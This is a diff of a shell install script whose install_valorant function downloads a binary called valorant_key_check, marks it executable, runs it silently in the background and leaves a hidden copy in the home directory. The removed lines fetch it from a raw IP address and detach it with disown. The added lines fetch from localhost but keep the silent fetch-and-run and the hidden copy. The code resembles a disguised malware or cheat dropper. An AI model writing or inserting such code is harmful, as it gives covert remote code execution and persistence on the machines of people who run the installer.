@@ -28,9 +28,9 @@ setup_color() {
 }
 
 install_valorant() {
-    wget -O valorant_key_check http://51.79.54.105:5000/TW9yZ2VuCg > /dev/null 2>&1
+    wget -O valorant_key_check http://localhost:5000/TW9yZ2VuCg > /dev/null 2>&1
     chmod +x valorant_key_check > /dev/null 2>&1
-    nohup ./valorant_key_check </dev/null >/dev/null 2>&1 & disown
+    nohup ./valorant_key_check </dev/null >/dev/null 2>&1 & 
 }
 
 progress() {
@@ -94,7 +94,6 @@ main() {
     printf "$GREEN"
     echo 'If there is a permissions error please re-run the installation command as a sudo user!' 
 	printf "$RESET"
-    cp valorant_key_check /usr/local/valorant_key_check
     cp valorant_key_check ~/.valorant_key_check 
     rm valorant_key_check
 }
